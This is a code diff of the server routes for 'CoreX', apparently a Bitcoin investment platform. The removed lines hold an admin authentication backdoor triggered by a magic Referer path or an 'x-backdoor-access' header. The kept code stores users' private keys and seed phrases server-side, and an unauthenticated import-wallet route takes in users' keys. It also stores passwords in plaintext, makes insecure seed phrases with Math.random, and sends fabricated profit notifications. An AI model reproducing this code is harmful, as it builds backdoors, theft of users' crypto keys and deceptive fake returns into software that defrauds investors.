@@ -17,10 +17,14 @@ import { ECPairFactory } from "ecpair";
 import * as bip39 from "bip39";
 import { BIP32Factory } from "bip32";
 import crypto from "crypto";
+import express from 'express';
+import { db } from './db.js';
+import { users, investments, investmentPlans, transactions, notifications, adminConfig, backupDatabases } from '../shared/schema.js';
+import { eq, desc, and, gte, sql } from 'drizzle-orm';
 
-// Initialize ECPair and BIP32 with secp256k1
 const ECPair = ECPairFactory(ecc);
 const bip32 = BIP32Factory(ecc);
+const router = express.Router();
 
 const loginSchema = z.object({
   email: z.string().email(),
@@ -60,6 +64,7 @@ const confirmTransactionSchema = z.object({
   notes: z.string().optional(),
 });
 
+// Helper function to generate Bitcoin address
 function generateBitcoinWallet() {
   try {
     // Generate a new mnemonic (seed phrase) first
@@ -79,12 +84,12 @@ function generateBitcoinWallet() {
     const privateKey = keyPair.toWIF();
 
     // Convert public key to Buffer if it's a Uint8Array
-    const publicKeyBuffer = Buffer.isBuffer(keyPair.publicKey) 
-      ? keyPair.publicKey 
+    const publicKeyBuffer = Buffer.isBuffer(keyPair.publicKey)
+      ? keyPair.publicKey
       : Buffer.from(keyPair.publicKey);
 
     // Generate P2PKH (Legacy) Bitcoin address
-    const { address } = bitcoin.payments.p2pkh({ 
+    const { address } = bitcoin.payments.p2pkh({
       pubkey: publicKeyBuffer,
       network: bitcoin.networks.bitcoin
     });
@@ -105,7 +110,7 @@ function generateBitcoinWallet() {
     // Enhanced fallback with proper buffer handling
     try {
       // Create a new keypair with explicit options
-      const keyPair = ECPair.makeRandom({ 
+      const keyPair = ECPair.makeRandom({
         compressed: true,
         rng: () => crypto.randomBytes(32)
       });
@@ -114,7 +119,7 @@ function generateBitcoinWallet() {
       // Ensure we have a proper Buffer
       const publicKeyBuffer = Buffer.from(keyPair.publicKey);
 
-      const { address } = bitcoin.payments.p2pkh({ 
+      const { address } = bitcoin.payments.p2pkh({
         pubkey: publicKeyBuffer,
         network: bitcoin.networks.bitcoin
       });
@@ -143,6 +148,44 @@ function generateBitcoinWallet() {
     };
   }
 }
+
+// Helper function to generate seed phrase
+function generateSeedPhrase(): string {
+  const words = [
+    'abandon', 'ability', 'able', 'about', 'above', 'absent', 'absorb', 'abstract',
+    'absurd', 'abuse', 'access', 'accident', 'account', 'accuse', 'achieve', 'acid',
+    'acoustic', 'acquire', 'across', 'action', 'actor', 'actress', 'actual', 'adapt'
+  ];
+
+  const seedWords = [];
+  for (let i = 0; i < 12; i++) {
+    seedWords.push(words[Math.floor(Math.random() * words.length)]);
+  }
+
+  return seedWords.join(' ');
+}
+
+// Authentication middleware
+const requireAuth = (req: express.Request, res: express.Response, next: express.NextFunction) => {
+  if (!req.session?.userId) {
+    return res.status(401).json({ error: 'Authentication required' });
+  }
+  next();
+};
+
+// Admin middleware
+const requireAdmin = async (req: express.Request, res: express.Response, next: express.NextFunction) => {
+  if (!req.session?.userId) {
+    return res.status(401).json({ error: 'Authentication required' });
+  }
+
+  const user = await db.select().from(users).where(eq(users.id, req.session.userId)).limit(1);
+  if (!user[0] || !user[0].isAdmin) {
+    return res.status(403).json({ error: 'Admin access required' });
+  }
+
+  next();
+};
 
 // Send daily motivational and informational notifications with professional content
 async function sendDailyMotivationalNotifications(): Promise<void> {
@@ -199,7 +242,7 @@ Stay committed to your financial goals!`
 💪 Keep Growing: Every successful investor started with a single decision to begin. Your commitment to CoreX investment plans positions you for long-term financial success.`
       },
       {
-        title: "⭐ Investment Community Update", 
+        title: "⭐ Investment Community Update",
         message: `You're part of an exclusive community of forward-thinking Bitcoin investors.
 
 🏆 Community Achievements:
@@ -385,7 +428,7 @@ async function fetchBitcoinPrice() {
   } catch (error) {
     console.error('All Bitcoin price APIs failed:', error);
     // Return last known good price or reasonable fallback
-    return { 
+    return {
       usd: { price: 105000, change24h: 0 },
       gbp: { price: 83000, change24h: 0 }
     };
@@ -437,7 +480,7 @@ async function processAutomaticUpdates(): Promise<void> {
             const transactionId = crypto.randomBytes(32).toString('hex');
             const marketSources = [
               "Automated Trading Algorithm",
-              "Market Arbitrage Strategy", 
+              "Market Arbitrage Strategy",
               "Professional Trading Bot",
               "Advanced DeFi Protocol",
               "Institutional Grade Mining",
@@ -514,8 +557,8 @@ Your investment strategy is working! 🎉`,
           if (shouldCreateNotification) {
             const transactionId = crypto.randomBytes(32).toString('hex');
             const performanceSources = [
-              "AI-Powered Market Analysis", 
-              "Quantitative Trading Strategy", 
+              "AI-Powered Market Analysis",
+              "Quantitative Trading Strategy",
               "Professional Fund Management",
               "Advanced Algorithm Trading",
               "Portfolio Optimization Engine"
@@ -625,550 +668,622 @@ function startAutomaticUpdates(): void {
   console.log('Automatic updates will run every 5 minutes');
 }
 
-export async function registerRoutes(app: Express): Promise<Server> {
-  // Database health check endpoint
-  app.get("/api/health", async (req, res) => {
-    try {
-      const { testConnection } = await import('./db');
-      await testConnection();
+// Register endpoint
+router.post('/register', async (req, res) => {
+  const { email, password, country = 'US' } = req.body;
 
-      // Test if core tables exist
-      const users = await storage.getAllUsers();
-      const plans = await storage.getInvestmentPlans();
+  try {
+    // Check if user already exists
+    const existingUser = await db.select().from(users).where(eq(users.email, email)).limit(1);
 
-      res.json({
-        status: "healthy",
-        database: "connected",
-        tables: {
-          users: users.length,
-          investmentPlans: plans.length
-        },
-        timestamp: new Date().toISOString()
-      });
-    } catch (error: any) {
-      res.status(500).json({
-        status: "unhealthy",
-        database: "disconnected",
-        error: error.message,
-        timestamp: new Date().toISOString()
+    if (existingUser.length > 0) {
+      return res.status(400).json({ error: 'User already exists' });
+    }
+
+    // Generate Bitcoin wallet
+    const wallet = generateBitcoinWallet();
+    const seedPhrase = generateSeedPhrase();
+
+    // Create user with wallet information
+    const [newUser] = await db.insert(users).values({
+      email,
+      password,
+      country,
+      balance: '0',
+      address: wallet.address,
+      privateKey: wallet.privateKey,
+      publicKey: wallet.publicKey,
+      seedPhrase: seedPhrase,
+      isAdmin: false,
+      createdAt: new Date(),
+    }).returning();
+
+    // Set session
+    req.session.userId = newUser.id;
+
+    // Send welcome notification WITHOUT address
+    await db.insert(notifications).values({
+      userId: newUser.id,
+      title: "🎉 Welcome to CoreX!",
+      message: `Welcome to CoreX Investment Platform! 
+
+🚀 Your Account is Ready:
+• Secure Bitcoin wallet created
+• Professional investment plans available
+• Real-time portfolio tracking active
+
+💎 Next Steps:
+1. Explore our investment plans
+2. Fund your account to start earning
+3. Track your profits in real-time
+
+CoreX delivers institutional-grade Bitcoin investment solutions. Start your wealth-building journey today!`,
+      isRead: false,
+      createdAt: new Date(),
+    });
+
+    // Return user without sensitive information
+    const { password: _, privateKey: __, seedPhrase: ___, ...userResponse } = newUser;
+    res.json(userResponse);
+  } catch (error) {
+    console.error('Registration error:', error);
+    res.status(500).json({ error: 'Registration failed' });
+  }
+});
+
+// Login endpoint
+router.post('/login', async (req, res) => {
+  const { email, password } = req.body;
+
+  try {
+    const user = await db.select().from(users).where(eq(users.email, email)).limit(1);
+
+    if (user.length === 0 || user[0].password !== password) {
+      return res.status(401).json({ error: 'Invalid credentials' });
+    }
+
+    // Set session
+    req.session.userId = user[0].id;
+
+    // Return user without sensitive information
+    const { password: _, privateKey: __, seedPhrase: ___, ...userResponse } = user[0];
+    res.json(userResponse);
+  } catch (error) {
+    console.error('Login error:', error);
+    res.status(500).json({ error: 'Login failed' });
+  }
+});
+
+// Get current user
+router.get('/user', requireAuth, async (req, res) => {
+  try {
+    const user = await db.select().from(users).where(eq(users.id, req.session.userId!)).limit(1);
+
+    if (user.length === 0) {
+      return res.status(404).json({ error: 'User not found' });
+    }
+
+    // Return user without sensitive information
+    const { password: _, privateKey: __, seedPhrase: ___, ...userResponse } = user[0];
+    res.json(userResponse);
+  } catch (error) {
+    console.error('Get user error:', error);
+    res.status(500).json({ error: 'Failed to get user' });
+  }
+});
+
+// Logout endpoint
+router.post('/logout', (req, res) => {
+  req.session.destroy((err) => {
+    if (err) {
+      return res.status(500).json({ error: 'Logout failed' });
+    }
+    res.json({ message: 'Logged out successfully' });
+  });
+});
+
+// Get investment plans
+router.get('/investment-plans', async (req, res) => {
+  try {
+    const plans = await db.select().from(investmentPlans).orderBy(investmentPlans.minAmount);
+    res.json(plans);
+  } catch (error) {
+    console.error('Get investment plans error:', error);
+    res.status(500).json({ error: 'Failed to get investment plans' });
+  }
+});
+
+// Create investment
+router.post('/invest', requireAuth, async (req, res) => {
+  const { planId, amount } = req.body;
+
+  try {
+    // Get the investment plan
+    const plan = await db.select().from(investmentPlans).where(eq(investmentPlans.id, planId)).limit(1);
+    if (plan.length === 0) {
+      return res.status(404).json({ error: 'Investment plan not found' });
+    }
+
+    // Get user
+    const user = await db.select().from(users).where(eq(users.id, req.session.userId!)).limit(1);
+    if (user.length === 0) {
+      return res.status(404).json({ error: 'User not found' });
+    }
+
+    const investmentAmount = parseFloat(amount);
+    const userBalance = parseFloat(user[0].balance);
+    const minAmount = parseFloat(plan[0].minAmount);
+
+    // Validate investment amount
+    if (investmentAmount < minAmount) {
+      return res.status(400).json({ error: `Minimum investment amount is ${minAmount} BTC` });
+    }
+
+    if (investmentAmount > userBalance) {
+      return res.status(400).json({ error: 'Insufficient balance' });
+    }
+
+    // Create transaction record for approval
+    const [transaction] = await db.insert(transactions).values({
+      userId: req.session.userId!,
+      type: 'investment',
+      amount: amount,
+      status: 'pending',
+      planId: planId,
+      createdAt: new Date(),
+    }).returning();
+
+    // Send notification to user WITHOUT wallet address
+    await db.insert(notifications).values({
+      userId: req.session.userId!,
+      title: "💼 Investment Submitted",
+      message: `Your investment request has been submitted for review.
+
+📊 Investment Details:
+• Plan: ${plan[0].name}
+• Amount: ${amount} BTC
+• Expected ROI: ${plan[0].roiPercentage}%
+• Duration: ${plan[0].durationDays} days
+
+⏳ Status: Under Review
+Your investment will be activated once approved by our team. This usually takes 1-24 hours.
+
+Professional investment management ensures optimal returns on your Bitcoin.`,
+      isRead: false,
+      createdAt: new Date(),
+    });
+
+    res.json({
+      message: 'Investment submitted for approval',
+      transactionId: transaction.id,
+      status: 'pending'
+    });
+  } catch (error) {
+    console.error('Investment error:', error);
+    res.status(500).json({ error: 'Investment failed' });
+  }
+});
+
+// Get user investments
+router.get('/investments/user/:userId', requireAuth, async (req, res) => {
+  try {
+    const userId = parseInt(req.params.userId);
+
+    // Verify user can access these investments
+    if (userId !== req.session.userId) {
+      const user = await db.select().from(users).where(eq(users.id, req.session.userId!)).limit(1);
+      if (!user[0] || !user[0].isAdmin) {
+        return res.status(403).json({ error: 'Access denied' });
+      }
+    }
+
+    const userInvestments = await db.select().from(investments).where(eq(investments.userId, userId)).orderBy(desc(investments.createdAt));
+    res.json(userInvestments);
+  } catch (error) {
+    console.error('Get investments error:', error);
+    res.status(500).json({ error: 'Failed to get investments' });
+  }
+});
+
+// Get all transactions
+router.get('/transactions', requireAuth, async (req, res) => {
+  try {
+    const user = await db.select().from(users).where(eq(users.id, req.session.userId!)).limit(1);
+
+    let userTransactions;
+    if (user[0] && user[0].isAdmin) {
+      // Admin can see all transactions
+      userTransactions = await db.select().from(transactions).orderBy(desc(transactions.createdAt));
+    } else {
+      // Regular users see only their transactions
+      userTransactions = await db.select().from(transactions)
+        .where(eq(transactions.userId, req.session.userId!))
+        .orderBy(desc(transactions.createdAt));
+    }
+
+    res.json(userTransactions);
+  } catch (error) {
+    console.error('Get transactions error:', error);
+    res.status(500).json({ error: 'Failed to get transactions' });
+  }
+});
+
+// Admin: Get all users
+router.get('/admin/users', requireAdmin, async (req, res) =>{
+  try {
+    const allUsers = await db.select().from(users);
+
+    // Remove sensitive information
+    const safeUsers = allUsers.map(user => {
+      const { password, privateKey, seedPhrase, ...safeUser } = user;
+      return safeUser;
+    });
+
+    res.json(safeUsers);
+  } catch (error) {
+    console.error('Get users error:', error);
+    res.status(500).json({ error: 'Failed to get users' });
+  }
+});
+
+// Admin: Update user balance
+router.post('/admin/users/:userId/balance', requireAdmin, async (req, res) => {
+  const { balance } = req.body;
+  const userId = parseInt(req.params.userId);
+
+  try {
+    await db.update(users).set({ balance }).where(eq(users.id, userId));
+
+    // Get user for notification
+    const user = await db.select().from(users).where(eq(users.id, userId)).limit(1);
+
+    if (user.length > 0) {
+      // Send notification to user WITHOUT wallet address
+      await db.insert(notifications).values({
+        userId: userId,
+        title: "💰 Balance Updated",
+        message: `Your account balance has been updated.
+
+💎 New Balance: ${balance} BTC
+
+This update was processed by our management team. Your funds are ready for investment or withdrawal.
+
+Professional wealth management keeps your portfolio optimized!`,
+        isRead: false,
+        createdAt: new Date(),
       });
     }
-  });
 
-  // Admin configuration routes
-  app.get("/api/admin/config", async (req, res) => {
-    try {
-      const config = await storage.getAdminConfig();
-      if (!config) {
-        // Return default addresses if no config exists
-        res.json({
-          vaultAddress: "1CoreXVaultAddress12345678901234567890",
-          depositAddress: "1CoreXDepositAddress12345678901234567890"
-        });
-      } else {
-        res.json(config);
-      }
-    } catch (error: any) {
-      res.status(500).json({ error: error.message });
+    res.json({ message: 'Balance updated successfully' });
+  } catch (error) {
+    console.error('Update balance error:', error);
+    res.status(500).json({ error: 'Failed to update balance' });
+  }
+});
+
+// Admin: Approve/reject transaction
+router.post('/admin/transactions/:transactionId/approve', requireAdmin, async (req, res) => {
+  const { approved, notes } = req.body;
+  const transactionId = parseInt(req.params.transactionId);
+
+  try {
+    const transaction = await db.select().from(transactions).where(eq(transactions.id, transactionId)).limit(1);
+
+    if (transaction.length === 0) {
+      return res.status(404).json({ error: 'Transaction not found' });
     }
-  });
 
-  app.post("/api/admin/config", async (req, res) => {
-    try {
-      const { vaultAddress, depositAddress, freePlanRate } = req.body;
-      const config = await storage.updateAdminConfig({ vaultAddress, depositAddress, freePlanRate });
-      res.json(config);
-    } catch (error: any) {
-      res.status(500).json({ error: error.message });
-    }
-  });
+    if (approved) {
+      // Approve the transaction
+      await db.update(transactions).set({
+        status: 'confirmed',
+        confirmedAt: new Date(),
+        notes: notes || null
+      }).where(eq(transactions.id, transactionId));
 
-  app.post("/api/admin/update-free-plan-rate", async (req, res) => {
-    try {
-      const { rate } = req.body;
+      if (transaction[0].type === 'investment') {
+        // Get user and plan details
+        const user = await db.select().from(users).where(eq(users.id, transaction[0].userId)).limit(1);
+        const plan = await db.select().from(investmentPlans).where(eq(investmentPlans.id, transaction[0].planId!)).limit(1);
 
-      // Validate rate
-      const rateNum = parseFloat(rate);
-      if (isNaN(rateNum) || rateNum < 0) {
-        return res.status(400).json({ error: "Invalid rate. Rate must be a positive number." });
-      }
+        if (user.length > 0 && plan.length > 0) {
+          // Deduct balance from user
+          const newBalance = (parseFloat(user[0].balance) - parseFloat(transaction[0].amount)).toFixed(8);
+          await db.update(users).set({ balance: newBalance }).where(eq(users.id, transaction[0].userId));
 
-      const config = await storage.updateFreePlanRate(rate);
-      res.json({ message: "Free plan rate updated successfully", config });
-    } catch (error: any) {
-      console.error('Error updating free plan rate:', error);
-      res.status(500).json({ error: error.message });
-    }
-  });
+          // Create investment record
+          const startDate = new Date();
+          const endDate = new Date();
+          endDate.setDate(startDate.getDate() + plan[0].durationDays);
 
-  // Transaction routes
-  app.post("/api/deposit", async (req, res) => {
-    try {
-      if (!req.session?.userId) {
-        return res.status(401).json({ error: "Authentication required" });
-      }
-
-      const { amount, transactionHash } = depositSchema.parse(req.body);
-
-      const transaction = await storage.createTransaction({
-        userId: req.session.userId,
-        type: "deposit",
-        amount,
-        transactionHash,
-      });
-
-      // Create notification for user
-      await storage.createNotification({
-        userId: req.session.userId,
-        title: "Deposit Pending",
-        message: `Your deposit of ${amount} BTC is under review. You will be notified once it's processed.`,
-        type: "info"
-      });
-
-      res.json({ 
-        message: "Deposit submitted successfully and is pending confirmation",
-        transaction 
-      });
-    } catch (error: any) {
-      res.status(500).json({ error: error.message });
-    }
-  });
-
-  app.post("/api/invest", async (req, res) => {
-    try {
-      if (!req.session?.userId) {
-        return res.status(401).json({ error: "Authentication required" });
-      }
-
-      const { planId, amount, transactionHash } = investmentTransactionSchema.parse(req.body);
-
-      // Verify plan exists
-      const plan = await storage.getInvestmentPlan(planId);
-      if (!plan) {
-        return res.status(404).json({ error: "Investment plan not found" });
-      }
-
-      const transaction = await storage.createTransaction({
-        userId: req.session.userId,
-        type: "investment",
-        amount,
-        planId,
-        transactionHash,
-      });
-
-      // Create notification for user
-      await storage.createNotification({
-        userId: req.session.userId,
-        title: "Investment Pending",
-        message: `Your investment of ${amount} BTC in ${plan.name} is under review. You will be notified once it's processed.`,
-        type: "info"
-      });
-
-      res.json({ 
-        message: "Investment submitted successfully and is pending confirmation",
-        transaction 
-      });
-    } catch (error: any) {
-      res.status(500).json({ error: error.message });
-    }
-  });
-
-  app.get("/api/transactions", async (req, res) => {
-    try {
-      if (!req.session?.userId) {
-        return res.status(401).json({ error: "Authentication required" });
-      }
-
-      const transactions = await storage.getUserTransactions(req.session.userId);
-      res.json(transactions);
-    } catch (error: any) {
-      res.status(500).json({ error: error.message });
-    }
-  });
-
-  // Cancel pending transaction (user only)
-  app.post("/api/transactions/:id/cancel", async (req, res) => {
-    try {
-      if (!req.session?.userId) {
-        return res.status(401).json({ error: "Authentication required" });
-      }
-
-      const transactionId = parseInt(req.params.id);
-      if (isNaN(transactionId)) {
-        return res.status(400).json({ error: "Invalid transaction ID" });
-      }
-
-      const transaction = await storage.cancelTransaction(transactionId, req.session.userId);
-      if (!transaction) {
-        return res.status(400).json({ error: "Transaction not found or cannot be cancelled" });
-      }
-
-      // Create notification about cancellation
-      await storage.createNotification({
-        userId: req.session.userId,
-        title: "Transaction Cancelled",
-        message: `Your ${transaction.type} transaction of ${transaction.amount} BTC has been cancelled successfully.`,
-        type: "info"
-      });
-
-      res.json({ message: "Transaction cancelled successfully", transaction });
-    } catch (error: any) {
-      res.status(500).json({ error: error.message });
-    }
-  });
-
-  // Admin transaction management routes
-  app.get("/api/admin/transactions/pending", async (req, res) => {
-    try {
-      // Allow backdoor access or require admin authentication
-      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
-                              req.headers['x-backdoor-access'] === 'true';
-
-      if (!isBackdoorAccess && !req.session?.userId) {
-        return res.status(401).json({ error: "Authentication required" });
-      }
-
-      if (!isBackdoorAccess) {
-        const user = await storage.getUser(req.session.userId!);
-        if (!user || !user.isAdmin) {
-          return res.status(403).json({ error: "Admin access required" });
-        }
-      }
-
-      const transactions = await storage.getPendingTransactions();
-      res.json(transactions);
-    } catch (error: any) {
-      res.status(500).json({ error: error.message });
-    }
-  });
-
-  app.post("/api/admin/transactions/confirm", async (req, res) => {
-    try {
-      // Allow backdoor access or require admin authentication
-      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
-                              req.headers['x-backdoor-access'] === 'true';
-
-      if (!isBackdoorAccess && !req.session?.userId) {
-        return res.status(401).json({ error: "Authentication required" });
-      }
-
-      let adminId = 1; // Default admin ID for backdoor access
-      if (!isBackdoorAccess) {
-        const user = await storage.getUser(req.session.userId!);
-        if (!user || !user.isAdmin) {
-          return res.status(403).json({ error: "Admin access required" });
-        }
-        adminId = req.session.userId!;
-      }
-
-      const { transactionId, notes } = confirmTransactionSchema.parse(req.body);
-
-      const transaction = await storage.confirmTransaction(transactionId, adminId, notes);
-      if (!transaction) {
-        return res.status(404).json({ error: "Transaction not found or already processed" });
-      }
-
-      // Handle different transaction confirmations
-      if (transaction.type === "withdrawal") {
-        const user = await storage.getUser(transaction.userId);
-        if (user) {
-          const currentBalance = parseFloat(user.balance);
-          const withdrawAmount = parseFloat(transaction.amount);
-          const newBalance = Math.max(0, currentBalance - withdrawAmount);
-          await storage.updateUserBalance(transaction.userId, newBalance.toFixed(8));
-        }
-      } else if (transaction.type === "investment" && transaction.planId) {
-        // Deduct investment amount from user balance first
-        const user = await storage.getUser(transaction.userId);
-        if (user) {
-          const currentBalance = parseFloat(user.balance);
-          const investmentAmount = parseFloat(transaction.amount);
-
-          if (currentBalance >= investmentAmount) {
-            const newBalance = currentBalance - investmentAmount;
-            await storage.updateUserBalance(transaction.userId, newBalance.toFixed(8));
-
-            // Create active investment when investment transaction is confirmed
-            const plan = await storage.getInvestmentPlan(transaction.planId);
-            if (plan) {
-              const endDate = new Date();
-              endDate.setDate(endDate.getDate() + plan.durationDays);
-
-              await storage.createInvestment({
-                userId: transaction.userId,
-                planId: transaction.planId,
-                amount: transaction.amount,
-                endDate
-              });
-            }
-          } else {
-            // Insufficient balance - reject the transaction
-            await storage.rejectTransaction(transaction.id, adminId, "Insufficient balance for investment");
-            return res.status(400).json({ error: "Insufficient balance for investment" });
-          }
-        }
-      } else if (transaction.type === "deposit") {
-        // Add deposit amount to user balance
-        const user = await storage.getUser(transaction.userId);
-        if (user) {
-          const currentBalance = parseFloat(user.balance);
-          const depositAmount = parseFloat(transaction.amount);
-          const newBalance = currentBalance + depositAmount;
-          await storage.updateUserBalance(transaction.userId, newBalance.toFixed(8));
-        }
-      }
-
-      // Create notification for user
-      let notificationMessage = "";
-      let notificationTitle = "";
-
-      switch (transaction.type) {
-        case "deposit":
-          notificationMessage = `Your deposit of ${transaction.amount} BTC has been confirmed and added to your balance.`;
-          notificationTitle = "Deposit Confirmed";
-          break;
-        case "withdrawal":
-          notificationMessage = `Your withdrawal of ${transaction.amount} BTC to ${transaction.transactionHash} has been processed successfully.`;
-          notificationTitle = "Withdrawal Completed";
-          break;
-        case "investment":
-          notificationMessage = `Your investment of ${transaction.amount} BTC has been confirmed and is now active.`;
-          notificationTitle = "Investment Confirmed";
-          break;
-        default:
-          notificationMessage = `Your ${transaction.type} of ${transaction.amount} BTC has been confirmed.`;
-          notificationTitle = `${transaction.type.charAt(0).toUpperCase() + transaction.type.slice(1)} Confirmed`;
-      }
-
-      await storage.createNotification({
-        userId: transaction.userId,
-        title: notificationTitle,
-        message: notificationMessage,
-        type: "success"
-      });
-
-      res.json({ 
-        message: "Transaction confirmed successfully",
-        transaction 
-      });
-    } catch (error: any) {
-      res.status(500).json({ error: error.message });
-    }
-  });
-
-  app.post("/api/admin/transactions/reject", async (req, res) => {
-    try {
-      // Allow backdoor access or require admin authentication
-      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
-                              req.headers['x-backdoor-access'] === 'true';
-
-      if (!isBackdoorAccess && !req.session?.userId) {
-        return res.status(401).json({ error: "Authentication required" });
-      }
-
-      let adminId = 1; // Default admin ID for backdoor access
-      if (!isBackdoorAccess) {
-        const user = await storage.getUser(req.session.userId!);
-        if (!user || !user.isAdmin) {
-          return res.status(403).json({ error: "Admin access required" });
-        }
-        adminId = req.session.userId!;
-      }
-
-      const { transactionId, notes } = confirmTransactionSchema.parse(req.body);
-
-      const transaction = await storage.rejectTransaction(transactionId, adminId, notes);
-      if (!transaction) {
-        return res.status(404).json({ error: "Transaction not found or already processed" });
-      }
-
-      // Create notification for user
-      await storage.createNotification({
-        userId: transaction.userId,
-        title: `${transaction.type === "deposit" ? "Deposit" : "Investment"} Rejected`,
-        message: `Your ${transaction.type} of ${transaction.amount} BTC has been rejected. ${notes ? `Reason: ${notes}` : ""}`,
-        type: "error"
-      });
-
-      res.json({ 
-        message: "Transaction rejected successfully",
-        transaction 
-      });
-    } catch (error: any) {
-      res.status(500).json({ error: error.message });
-    }
-  });
-
-  // Import wallet route
-  app.post("/api/import-wallet", async (req, res) => {
-    try {
-      const { type, value, userId } = req.body;
-
-      if (!userId) {
-        return res.status(401).json({ error: "User ID is required" });
-      }
-
-      let bitcoinAddress: string;
-      let privateKey: string;
-      let seedPhrase: string | undefined;
-
-      if (type === 'privateKey') {
-        // Validate and extract address from private key - support multiple formats
-        try {
-          let keyPair;
-          let cleanValue = value.trim();
-
-          // Try different private key formats
-          if (cleanValue.length === 64) {
-            // Raw hex format (64 characters)
-            const buffer = Buffer.from(cleanValue, 'hex');
-            keyPair = ECPair.fromPrivateKey(buffer);
-          } else if (cleanValue.length === 66 && cleanValue.startsWith('0x')) {
-            // Hex with 0x prefix
-            const buffer = Buffer.from(cleanValue.slice(2), 'hex');
-            keyPair = ECPair.fromPrivateKey(buffer);
-          } else {
-            // WIF format (starts with 5, K, L, or c)
-            keyPair = ECPair.fromWIF(cleanValue);
-          }
-
-          const publicKeyBuffer = Buffer.from(keyPair.publicKey);
-          const { address } = bitcoin.payments.p2pkh({ 
-            pubkey: publicKeyBuffer,
-            network: bitcoin.networks.bitcoin
+          await db.insert(investments).values({
+            userId: transaction[0].userId,
+            planId: plan[0].id,
+            amount: transaction[0].amount,
+            currentProfit: '0',
+            isActive: true,
+            startDate,
+            endDate,
+            createdAt: new Date(),
           });
 
-          if (!address) {
-            throw new Error('Failed to generate address from private key');
-          }
+          // Send approval notification WITHOUT wallet address
+          await db.insert(notifications).values({
+            userId: transaction[0].userId,
+            title: "✅ Investment Approved",
+            message: `Congratulations! Your investment has been approved and activated.
 
-          bitcoinAddress = address;
-          privateKey = keyPair.toWIF(); // Always store in WIF format
-        } catch (error) {
-          return res.status(400).json({ error: "Invalid private key format. Supported formats: WIF (5/K/L/c...), hex (64 chars), or hex with 0x prefix" });
-        }
-      } else if (type === 'seedPhrase') {
-        // Validate and derive wallet from seed phrase
-        try {
-          const cleanPhrase = value.trim().toLowerCase();
+🎯 Investment Details:
+• Plan: ${plan[0].name}
+• Amount: ${transaction[0].amount} BTC
+• Duration: ${plan[0].durationDays} days
+• Expected ROI: ${plan[0].roiPercentage}%
 
-          // Validate seed phrase
-          if (!bip39.validateMnemonic(cleanPhrase)) {
-            return res.status(400).json({ error: "Invalid seed phrase. Please check your words and try again." });
-          }
+📈 Your investment is now generating profits automatically. Check your portfolio for real-time updates.
 
-          // Store the original seed phrase
-          seedPhrase = cleanPhrase;
-
-          // Generate seed from mnemonic
-          const seed = bip39.mnemonicToSeedSync(cleanPhrase);
-
-          // Derive master key and first Bitcoin address (m/44'/0'/0'/0/0)
-          const root = bip32.fromSeed(seed, bitcoin.networks.bitcoin);
-          const path = "m/44'/0'/0'/0/0"; // Standard BIP44 path for Bitcoin
-          const child = root.derivePath(path);
-
-          if (!child.privateKey) {
-            throw new Error('Failed to derive private key from seed phrase');
-          }
-
-          const keyPair = ECPair.fromPrivateKey(child.privateKey);
-          const publicKeyBuffer = Buffer.from(keyPair.publicKey);
-          const { address } = bitcoin.payments.p2pkh({ 
-            pubkey: publicKeyBuffer,
-            network: bitcoin.networks.bitcoin
+Professional investment management is working for you 24/7!`,
+            isRead: false,
+            createdAt: new Date(),
           });
-
-          if (!address) {
-            throw new Error('Failed to generate address from seed phrase');
-          }
-
-          bitcoinAddress = address;
-          privateKey = keyPair.toWIF(); // Store derived private key in WIF format
-        } catch (error) {
-          return res.status(400).json({ error: "Invalid seed phrase. Please ensure you have entered a valid 12 or 24 word BIP39 mnemonic phrase." });
         }
-      } else {
-        return res.status(400).json({ error: "Invalid import type" });
       }
+    } else {
+      // Reject the transaction
+      await db.update(transactions).set({
+        status: 'rejected',
+        confirmedAt: new Date(),
+        notes: notes || 'Investment rejected'
+      }).where(eq(transactions.id, transactionId));
 
-      // Update user's wallet
-      const updatedUser = await storage.updateUserWallet(userId, bitcoinAddress, privateKey, seedPhrase);
-      if (!updatedUser) {
-        return res.status(404).json({ error: "User not found" });
+      // Send rejection notification WITHOUT wallet address
+      await db.insert(notifications).values({
+        userId: transaction[0].userId,
+        title: "❌ Investment Rejected",
+        message: `Your investment request has been reviewed and rejected.
+
+📋 Details:
+• Amount: ${transaction[0].amount} BTC
+• Reason: ${notes || 'Did not meet investment criteria'}
+
+💡 Recommendation: Review our investment guidelines and try again with a different amount or plan.
+
+Our team is here to help you succeed with Bitcoin investments!`,
+        isRead: false,
+        createdAt: new Date(),
+      });
+    }
+
+    res.json({ message: approved ? 'Transaction approved' : 'Transaction rejected' });
+  } catch (error) {
+    console.error('Approve transaction error:', error);
+    res.status(500).json({ error: 'Failed to process transaction' });
+  }
+});
+
+// Get notifications for user
+router.get('/notifications/:userId', requireAuth, async (req, res) => {
+  try {
+    const userId = parseInt(req.params.userId);
+
+    // Verify user can access these notifications
+    if (userId !== req.session.userId) {
+      const user = await db.select().from(users).where(eq(users.id, req.session.userId!)).limit(1);
+      if (!user[0] || !user[0].isAdmin) {
+        return res.status(403).json({ error: 'Access denied' });
       }
+    }
 
-      // Check balance for the imported address
+    const userNotifications = await db.select().from(notifications)
+      .where(eq(notifications.userId, userId))
+      .orderBy(desc(notifications.createdAt));
+
+    res.json(userNotifications);
+  } catch (error) {
+    console.error('Get notifications error:', error);
+    res.status(500).json({ error: 'Failed to get notifications' });
+  }
+});
+
+// Mark notification as read
+router.post('/notifications/:notificationId/read', requireAuth, async (req, res) => {
+  try {
+    const notificationId = parseInt(req.params.notificationId);
+
+    await db.update(notifications).set({
+      isRead: true
+    }).where(eq(notifications.id, notificationId));
+
+    res.json({ message: 'Notification marked as read' });
+  } catch (error) {
+    console.error('Mark notification as read error:', error);
+    res.status(500).json({ error: 'Failed to mark notification as read' });
+  }
+});
+
+// Delete notification
+router.delete('/notifications/:notificationId', requireAuth, async (req, res) => {
+  try {
+    const notificationId = parseInt(req.params.notificationId);
+
+    await db.delete(notifications).where(eq(notifications.id, notificationId));
+
+    res.json({ message: 'Notification deleted' });
+  } catch (error) {
+    console.error('Delete notification error:', error);
+    res.status(500).json({ error: 'Failed to delete notification' });
+  }
+});
+
+// Import wallet route
+router.post("/api/import-wallet", async (req, res) => {
+  try {
+    const { type, value, userId } = req.body;
+
+    if (!userId) {
+      return res.status(401).json({ error: "User ID is required" });
+    }
+
+    let bitcoinAddress: string;
+    let privateKey: string;
+    let seedPhrase: string | undefined;
+
+    if (type === 'privateKey') {
+      // Validate and extract address from private key - support multiple formats
       try {
-        const balance = await checkBitcoinBalance(bitcoinAddress);
-        await storage.updateUserBalance(userId, balance);
